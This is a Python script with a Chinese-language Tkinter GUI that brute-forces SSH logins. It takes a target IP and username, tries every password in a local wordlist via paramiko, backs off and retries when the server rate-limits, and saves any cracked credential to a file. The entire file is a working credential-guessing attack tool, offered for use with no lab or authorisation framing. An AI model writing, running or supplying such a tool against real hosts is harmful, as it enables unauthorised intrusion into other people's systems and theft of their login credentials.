from tkinter import*
from tkinter import messagebox
import paramiko
import socket
import time
import threading
#---------------------------------------------------'
bools = True

#---------------------------------------------------
def is_ssh_open(hostname,username,password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname,username=username,password=password,timeout=3)
    except socket.timeout:
        print(f'[-]无法连接主机:{hostname},连接超时!')
        messagebox.showinfo("密码破解-linux","连接超时")
    except paramiko.AuthenticationException:
        print(f'[-]错误的账号密码:{username}:{password}')
        return 'pass'
    except paramiko.SSHException:
        print('[-]似乎尝试次数过多,30秒后尝试')
        messagebox.showinfo("密码破解-linux","似乎尝试次数过多,30秒后尝试")
        time.sleep(30)
        return is_ssh_open(hostname,username,password)
    except:
        print('[-]检查主机是否存在或未开放ssh')
        messagebox.showinfo("密码破解-linux","检查主机是否存在或未开放ssh")
        return False
    else:
        print(f'主机{hostname}破解成功 ssh账号密码:   {username}:{password}     ')
        passwd = '密码破解成功1 ' + username + ':' + password
        messagebox.showinfo("密码破解",passwd)
        return True

def ssh_main(hostname,username):
    i = 1
    password_list = open('pwd.txt').read().splitlines()
    messagebox.showinfo("密码破解-linux","破解开始")
    for password in password_list:
        ssh_password = is_ssh_open(hostname=hostname,username=username,password=password)
        if bools:
            if ssh_password:
                open('ssh.txt','w').write(f'{username}@{hostname}:{password}')
                break
            else:
                if ssh_password == 'pass':
                    pass
                else:
                    i = i + 1
                    if i > 3:
                        print('[-]错误次数超过3,以退出')
                        messagebox.showinfo("密码破解-linux","错误次数超过3,以退出")
                        break
        else:
            print('[*]以退出')
            break
#--------------------------------------------------------
def start_password():
    global bools
    hostname = en.get()
    username = en_1.get()
    bools = True
    t = threading.Thread(target=ssh_main,args=(hostname,username))
    t.start()
def stop_password():
    global bools
    bools = False
    messagebox.showinfo("密码破解-linux","破解结束")
    return True

#---------------------------------------------------
tk = Tk()
tk.title('密码破解-linux')
tk.geometry('300x160+420+200')
#----------------------------------------------------
en = Entry(tk)
en.place(x=70,y=20)
en_1 = Entry(tk)
en_1.place(x=70,y=60)
#--------------------------text------------------
w= Label(tk,text='目标IP:',fg="red")
w.place(x=20,y=20)
w_2= Label(tk,text='用户名:',fg="red")
w_2.place(x=20,y=60)
#------------------------start or stop----------------
b = Button(tk, text ="开始破解", command=start_password)
b.place(x=20,y=90)
b_2 = Button(tk, text ="停止", command=stop_password)
b_2.place(x=150,y=90)
tk.mainloop()
#------------------------start-GUI--------------------
tk.mainloop()
#-------------------------over-------------------------

